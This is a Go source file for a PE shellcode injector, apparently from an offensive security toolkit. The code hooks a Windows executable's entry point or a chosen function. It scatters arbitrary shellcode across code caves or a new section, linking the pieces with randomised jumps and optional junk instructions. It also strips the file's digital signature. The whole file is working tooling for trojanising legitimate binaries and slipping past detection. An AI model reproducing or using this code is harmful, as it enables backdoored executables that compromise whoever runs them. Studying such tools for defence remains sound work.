package injector

import (
	"bytes"
	cr "crypto/rand"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/For-ACGN/go-keystone"
	"golang.org/x/arch/x86/x86asm"
)

// support modes:
//
// 1. code cave
// The loader and shellcode body are all injected to code caves.
// It will only change the .text section.
//
// 2. extend section
// The loader is injected to code caves.
// The shellcode body is injected to the last extended section.
// It will change the .text section, adjust the last section
// header and the OptionalHeader.SizeOfImage
//
// 3. create section
// The loader and shellcode body are all injected to a new section.
// It will change the .text section, create a new section, adjust
// the FileHeader.NumberOfSections and OptionalHeader.SizeOfImage

// these modes are used to display the mode that injector used.
const (
	ModeCodeCave      = "code-cave"
	ModeExtendSection = "extend-section"
	ModeCreateSection = "create-section"
)

// endOfShellcode is used to mark the end of shellcode.
// NOP DWORD ptr [EAX + EAX*1 + 00]
var endOfShellcode = []byte{0x0F, 0x1F, 0x44, 0x00, 0x00}

// Injector is a simple PE injector for inject shellcode.
type Injector struct {
	rand *rand.Rand

	// assembler engine
	engine *keystone.Engine

	// context arguments
	raw  bool
	ctx  *Context
	opts *Options
	arch string
	dup  []byte

	// about pe image
	img   *pe.File
	hdr32 *pe.OptionalHeader32
	hdr64 *pe.OptionalHeader64

	// about process IAT
	vm  []byte
	iat []*iat

	// about create section mode
	section *pe.SectionHeader

	// about hook function
	oriInst [][]byte
	retRVA  uint32

	// about relocated shellcode
	segment    [][]byte
	contextSeq []int
	ccList     []*codeCave

	// for write shellcode segment
	caves []*codeCave

	// for select random register
	regBox []string
}

// Options contains options about inject shellcode.
type Options struct {
	// specify the target function address that will
	// be hooked, it is an VA address, not a file offset
	// or RVA, remember disable ASLR when debug image.
	// if it is zero, use the entry point.
	Address uint64

	// not append instruction about save and restore context
	// if your shellcode need hijack function argument or
	// register, you need set it with true.
	NotSaveContext bool

	// not create thread at the shellcode,
	// ensure the shellcode can be called as a function.
	// on x86, the calling convention is stdcall.
	// it is useless for method InjectRaw.
	NotCreateThread bool

	// not wait created thread at the shellcode,
	// it will not erase shellcode after execute finish.
	// it is useless for method InjectRaw.
	NotWaitThread bool

	// not erase shellcode after execute finish.
	// when you need run shellcode as a background
	// program, you need set it with true.
	// it is useless for method InjectRaw.
	NotEraseShellcode bool

	// force use code cave mode for write shellcode.
	// if code cave is not enough, it will return an error.
	ForceCodeCave bool

	// force extend the last section even if the number
	// of code cave is enough for write shellcode.
	// it is useless for method InjectRaw.
	ForceExtendSection bool

	// force create a new section after the last section
	// for write loader and shellcode.
	ForceCreateSection bool

	// specify the new section name, the default is ".patch".
	SectionName string

	// not append garbage instruction to loader.
	// It is only for Inject with ModeCreateSection.
	NoGarbage bool

	// specify a random seed for test and debug.
	RandSeed int64

	// specify the x86 loader template.
	LoaderX86 string

	// specify the x64 loader template.
	LoaderX64 string

	// specify the x86 junk code templates.
	JunkCodeX86 []string

	// specify the x64 junk code templates.
	JunkCodeX64 []string

	// append custom argument for loader template.
	Arguments map[string]interface{}
}

// Context contains the output and context data in Inject and InjectRaw.
type Context struct {
	Output []byte

	Arch  string
	Mode  string
	IsRaw bool
	Seed  int64

	SaveContext    bool
	CreateThread   bool
	WaitThread     bool
	EraseShellcode bool
	SectionName    string

	HasAllProcedures  bool
	HasVirtualAlloc   bool
	HasVirtualProtect bool
	HasCreateThread   bool
	HasLoadLibraryA   bool
	HasLoadLibraryW   bool

	NumCodeCaves  int
	NumLoaderInst int
	HookAddress   uint64
}

// NewInjector is used to create a simple PE injector.
func NewInjector() *Injector {
	var seed int64
	buf := make([]byte, 8)
	_, err := cr.Read(buf)
	if err == nil {
		seed = int64(binary.LittleEndian.Uint64(buf)) // #nosec G115
	} else {
		seed = time.Now().UTC().UnixNano()
	}
	injector := Injector{
		rand: rand.New(rand.NewSource(seed)), // #nosec
	}
	return &injector
}

// Inject is used to inject shellcode to a PE image file.
// It will inject a shellcode loader to code cave,
// loader will decrypt and execute the input shellcode.
func (inj *Injector) Inject(image, shellcode []byte, opts *Options) (*Context, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode")
	}
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// set method flag
	inj.raw = false
	loader, err := inj.buildLoader(shellcode)
	if err != nil {
		return nil, fmt.Errorf("failed to build loader: %s", err)
	}
	err = inj.inject(loader, false)
	if err != nil {
		return nil, fmt.Errorf("failed to inject loader: %s", err)
	}
	inj.ctx.Output = inj.dup
	inj.cleanup()
	return inj.ctx, nil
}

// InjectRaw is used to inject shellcode to a PE image without loader.
// It is an advanced usage, ensure the shellcode not contains behavior
// like read data from the shellcode tail.
// Must use "nop 5" for set a flag that define the end of shellcode.
func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) (*Context, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode")
	}
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// set method flag
	inj.raw = true
	// auto append the mark about end of shellcode
	shellcode = bytes.Clone(shellcode)
	shellcode = append(shellcode, endOfShellcode...)
	// prepare force inject mode
	opts = inj.opts
	if opts.ForceCodeCave && opts.ForceCreateSection {
		return nil, errors.New("invalid force mode with shellcode source")
	}
	if opts.ForceCreateSection {
		err = inj.createSectionForRaw(shellcode)
		if err != nil {
			return nil, err
		}
	}
	err = inj.inject(shellcode, true)
	if err != nil {
		return nil, fmt.Errorf("failed to inject shellcode: %s", err)
	}
	inj.ctx.Output = inj.dup
	inj.cleanup()
	return inj.ctx, nil
}

func (inj *Injector) inject(shellcode []byte, raw bool) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New(fmt.Sprint(r))
		}
	}()
	targetRVA := inj.selectTargetRVA()
	inj.ctx.HookAddress = inj.rvaToVA(targetRVA)
	first := inj.selectFirstCodeCave(targetRVA)
	var dstRVA uint32
	if inj.section != nil {
		dstRVA = inj.section.VirtualAddress
	} else {
		if first == nil {
			return errors.New("not enough code caves for inject shellcode")
		}
		dstRVA = first.virtualAddr
	}
	err = inj.hook(targetRVA, dstRVA)
	if err != nil {
		return fmt.Errorf("failed to hook target function: %s", err)
	}
	err = inj.slice(shellcode)
	if err != nil {
		return err
	}
	if inj.section != nil {
		inj.ctx.Mode = ModeCreateSection
		inj.padding(shellcode, targetRVA)
		return nil
	}
	if !raw {
		return inj.insert(targetRVA, first)
	}
	// try to cove cave mode
	inj.ctx.Mode = ModeCodeCave
	err = inj.insert(targetRVA, first)
	if err == nil {
		return nil
	}
	if inj.opts.ForceCodeCave {
		return err
	}
	inj.ctx.Mode = ModeCreateSection
	// if failed, try to use create section mode
	err = inj.createSectionForRaw(shellcode)
	if err != nil {
		return err
	}
	inj.padding(shellcode, targetRVA)
	return nil
}

func (inj *Injector) initAssembler() error {
	var err error
	switch inj.arch {
	case "386":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_32)
	case "amd64":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
	}
	if err != nil {
		return err
	}
	return inj.engine.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
}

func (inj *Injector) assemble(src string) ([]byte, error) {
	if strings.Contains(src, "<no value>") {
		return nil, errors.New("invalid register in assembly source")
	}
	return inj.engine.Assemble(src, 0)
}

func (inj *Injector) preprocess(image []byte, opts *Options) error {
	if opts == nil {
		opts = new(Options)
	}
	inj.opts = opts
	// check image architecture
	peFile, err := pe.NewFile(bytes.NewReader(image))
	if err != nil {
		return err
	}
	var arch string
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "386"
		inj.hdr32 = peFile.OptionalHeader.(*pe.OptionalHeader32)
	case pe.IMAGE_FILE_MACHINE_AMD64:
		arch = "amd64"
		inj.hdr64 = peFile.OptionalHeader.(*pe.OptionalHeader64)
	default:
		return errors.New("unknown pe image architecture type")
	}
	inj.img = peFile
	inj.arch = arch
	inj.loadImage(image)
	// scan code cave in image text section
	caves, err := inj.scanCodeCave()
	if err != nil {
		return fmt.Errorf("failed to scan code cave: %s", err)
	}
	inj.caves = caves
	// set random seed
	seed := opts.RandSeed
	if seed == 0 {
		seed = inj.rand.Int63()
	}
	inj.rand.Seed(seed)
	// make duplicate for make output image
	inj.dup = bytes.Clone(image)
	// remove the digital signature of the PE file
	inj.removeSignature()
	// update context
	inj.ctx = &Context{
		Arch: arch,
		Seed: seed,

		SaveContext:    !opts.NotSaveContext,
		CreateThread:   !opts.NotCreateThread,
		WaitThread:     !opts.NotWaitThread,
		EraseShellcode: !opts.NotEraseShellcode,

		NumCodeCaves: len(caves),
	}
	return nil
}

func (inj *Injector) selectTargetRVA() uint32 {
	var entryPoint uint32
	switch inj.arch {
	case "386":
		entryPoint = inj.hdr32.AddressOfEntryPoint
	case "amd64":
		entryPoint = inj.hdr64.AddressOfEntryPoint
	}
	var targetRVA uint32
	if inj.opts.Address != 0 {
		targetRVA = inj.vaToRVA(inj.opts.Address)
	} else {
		targetRVA = entryPoint
	}
	return targetRVA
}

func (inj *Injector) selectFirstCodeCave(targetRVA uint32) *codeCave {
	var first *codeCave
	// search a cave near the target RVA
	for i, cave := range inj.caves {
		offset := int64(cave.virtualAddr) - int64(targetRVA)
		if offset <= 4096 && offset >= -4096 {
			first = cave
			inj.removeCodeCave(i)
			break
		}
	}
	// if failed to search target, random select a cave
	if first == nil && len(inj.caves) > 0 {
		i := inj.rand.Intn(len(inj.caves))
		first = inj.caves[i]
		inj.removeCodeCave(i)
	}
	return first
}

// hook target function for add a jmp to the first code cave
// #nosec G115
func (inj *Injector) hook(srcRVA uint32, dstRVA uint32) error {
	offset := int(inj.rvaToOffset(".text", srcRVA))
	if offset+32 > len(inj.dup) {
		return errors.New("target offset is overflow")
	}
	insts, err := inj.disassemble(inj.dup[offset : offset+32])
	if err != nil {
		return err
	}
	numInst, totalSize, err := calcInstNumAndSize(insts)
	if err != nil {
		return err
	}
	// backup original instruction that will be hooked
	var off int
	original := make([][]byte, numInst)
	for i := 0; i < numInst; i++ {
		original[i] = make([]byte, insts[i].Len)
		copy(original[i], inj.dup[offset+off:])
		off += insts[i].Len
	}
	inj.oriInst = original
	// record the next instruction offset
	inj.retRVA = srcRVA + uint32(totalSize)
	// build a patch for jump to the first code cave
	jmp := make([]byte, nearJumpSize)
	jmp[0] = 0xE9
	rel := int64(dstRVA) - int64(srcRVA) - nearJumpSize
	binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
	padding := bytes.Repeat([]byte{0xCC}, totalSize-nearJumpSize)
	patch := make([]byte, 0, totalSize)
	patch = append(patch, jmp...)
	patch = append(patch, padding...)
	copy(inj.dup[offset:], patch)
	return nil
}

// calcInstNumAndSize is used to calculate the instruction number
// and the total size that will be overwritten.
func calcInstNumAndSize(insts []*x86asm.Inst) (int, int, error) {
	var (
		num  int
		size int
	)
	for i := 0; i < len(insts); i++ {
		num++
		size += insts[i].Len
		if size >= nearJumpSize {
			return num, size, nil
		}
	}
	return 0, 0, errors.New("unable to insert near jmp to this address")
}

// slice will disassemble shellcode and return a slice of instruction segment.
func (inj *Injector) slice(shellcode []byte) error {
	insts, err := inj.disassemble(shellcode)
	if err != nil {
		return fmt.Errorf("failed to disassemble shellcode: %s", err)
	}
	var off int
	segments := make([][]byte, len(insts))
	for i := 0; i < len(insts); i++ {
		l := insts[i].Len
		segments[i] = make([]byte, l)
		copy(segments[i], shellcode[off:])
		off += l
	}
	inj.segment = segments
	// update context
	if !inj.raw {
		inj.ctx.NumLoaderInst = len(segments)
	}
	inj.ctx.IsRaw = inj.raw
	return nil
}

// insert shellcode segment and the patched instruction to code caves.
// #nosec G115
func (inj *Injector) insert(targetRVA uint32, first *codeCave) error {
	var (
		saveContext    [][]byte
		restoreContext [][]byte
	)
	if !inj.opts.NotSaveContext {
		saveContext = inj.saveContext()
		restoreContext = inj.restoreContext()
	}
	num := len(saveContext) + len(restoreContext) + len(inj.segment) + len(inj.oriInst) + 4
	if num > len(inj.caves) {
		return errors.New("not enough code caves to inject shellcode")
	}
	current := first
	next := inj.selectCodeCave()
	// insert instruction about save context
	for i := 0; i < len(saveContext); i++ {
		inst := saveContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		copy(inj.dup[current.pointerToRaw:], rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// generate code cave list before insert for relocate instruction
	type item struct {
		current *codeCave
		next    *codeCave
	}
	list := make([]*item, len(inj.segment))
	ccLi := make([]*codeCave, len(inj.segment))
	for i := 0; i < len(inj.segment); i++ {
		list[i] = &item{
			current: current,
			next:    next,
		}
		ccLi[i] = current
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	inj.ccList = ccLi
	// insert shellcode segment
	for i := 0; i < len(inj.segment); i++ {
		c := list[i].current
		n := list[i].next
		segment := inj.relocateSegment(inj.segment[i], i, c)
		size := uint32(len(segment))
		if size+nearJumpSize > uint32(c.size) {
			return errors.New("appear too large instruction in shellcode")
		}
		// check it is the end of the shellcode
		if bytes.Equal(segment, endOfShellcode) {
			rel := int64(current.virtualAddr) - int64(c.virtualAddr) - nearJumpSize
			jmp := make([]byte, nearJumpSize)
			jmp[0] = 0xE9
			binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
			copy(inj.dup[c.pointerToRaw:], jmp)
			continue
		}
		// build jmp instruction to next code cave
		rel := int64(n.virtualAddr) - int64(c.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, segment...)
		rebuild = append(rebuild, jmp...)
		copy(inj.dup[c.pointerToRaw:], rebuild)
	}
	// insert instruction about restore context
	for i := 0; i < len(restoreContext); i++ {
		inst := restoreContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		copy(inj.dup[current.pointerToRaw:], rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// insert original instruction about patch
	var offTarget uint32
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		size := uint32(len(inst))
		if size+nearJumpSize > uint32(current.size) {
			return errors.New("appear too large original instruction in patch")
		}
		// relocate instruction
		offset := int64(current.virtualAddr) - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		// build jmp instruction to next code cave or original instruction
		var rel int64
		if i != len(inj.oriInst)-1 {
			rel = int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		} else {
			rel = int64(inj.retRVA) - int64(current.virtualAddr+size) - nearJumpSize
		}
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		copy(inj.dup[current.pointerToRaw:], rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
		offTarget += uint32(len(inj.oriInst[i]))
	}
	return nil
}

// relocate shellcode instruction segment if it has PC-relative address.
// #nosec G115
func (inj *Injector) relocateSegment(segment []byte, idx int, current *codeCave) []byte {
	inst, err := inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	if inst.PCRel == 0 {
		return segment
	}
	switch inst.Args[0].(type) {
	case x86asm.Rel:
	// case x86asm.Reg:
	default:
		return segment
	}
	// calculate the target instruction in original shellcode
	var direction bool // true is after PC
	rel := int32(inst.Args[0].(x86asm.Rel))
	if rel >= 0 {
		direction = true
	}
	var (
		off int32
		dst int
	)
	if direction {
		for j := idx + 1; j < len(inj.segment); j++ {
			if off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j]))
		}
	} else {
		off += int32(inst.Len)
		for j := idx; j >= 0; j-- {
			if -off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j-1]))
		}
	}
	// extend instruction segment and decode
	segment = inj.extendInstruction(inst, segment)
	inst, err = inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	// calculate the two code cave offset
	vDst := int64(inj.ccList[dst].virtualAddr)
	vSrc := int64(current.virtualAddr + uint32(inst.Len))
	offset := vSrc - vDst + int64(rel)
	// calculate the last offset and relocate instruction
	return inj.relocateInstruction(segment, offset)
}

func (inj *Injector) selectCodeCave() *codeCave {
	i := inj.rand.Intn(len(inj.caves))
	cave := inj.caves[i]
	inj.removeCodeCave(i)
	return cave
}

func (inj *Injector) removeCodeCave(i int) {
	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
}

func (inj *Injector) createSectionForRaw(shellcode []byte) error {
	size := uint32(len(shellcode)) // #nosec G115
	if !inj.opts.NotSaveContext {
		size += 1024
	}
	section, err := inj.createSection(inj.opts.SectionName, size)
	if err != nil {
		return err
	}
	inj.section = section
	return nil
}

// padding is used to padding shellcode to the created section.
// #nosec G115
func (inj *Injector) padding(shellcode []byte, targetRVA uint32) {
	var (
		saveContext    []byte
		restoreContext []byte
	)
	if !inj.opts.NotSaveContext {
		saveContext = mergeBytes(inj.saveContext())
		restoreContext = mergeBytes(inj.restoreContext())
	}
	var oriInstOffset uint32
	oriInstOffset += uint32(len(saveContext))
	oriInstOffset += uint32(len(shellcode))
	oriInstOffset += uint32(len(restoreContext))
	// build final instructions
	insts := bytes.NewBuffer(make([]byte, 0, len(shellcode)+64))
	// replace the end of shellcode to jmp to the tail of shellcode
	insts.Write(saveContext)
	var scLen uint32
	for i := 0; i < len(inj.segment); i++ {
		segment := inj.segment[i]
		// check it is the end of the shellcode
		if !bytes.Equal(segment, endOfShellcode) {
			insts.Write(segment)
			scLen += uint32(len(segment))
			continue
		}
		offset := uint32(len(shellcode)) - scLen
		rel := offset - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], rel)
		insts.Write(jmp)
	}
	insts.Write(restoreContext)
	// write hooked original instruction
	var (
		offTarget uint32
		offInst   uint32
	)
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		// relocate instruction
		current := int64(inj.section.VirtualAddress + oriInstOffset + offInst)
		offset := current - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		insts.Write(inst)
		offTarget += uint32(len(inj.oriInst[i]))
		offInst += uint32(len(inst))
	}
	// write jmp to the next original instruction
	offset := inj.section.VirtualAddress + oriInstOffset + offInst
	rel := int64(inj.retRVA) - int64(offset) - nearJumpSize
	jmp := make([]byte, nearJumpSize)
	jmp[0] = 0xE9
	binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
	insts.Write(jmp)
	// write shellcode loader
	copy(inj.dup[inj.section.Offset:], insts.Bytes())
}

func mergeBytes(b [][]byte) []byte {
	var o []byte
	for i := 0; i < len(b); i++ {
		o = append(o, b[i]...)
	}
	return o
}

func (inj *Injector) cleanup() {
	inj.dup = nil
	inj.img = nil
	inj.vm = nil
	inj.section = nil
	inj.segment = nil
	inj.caves = nil
}

// Close is used to close pe injector.
func (inj *Injector) Close() error {
	if inj.engine == nil {
		return nil
	}
	return inj.engine.Close()
}
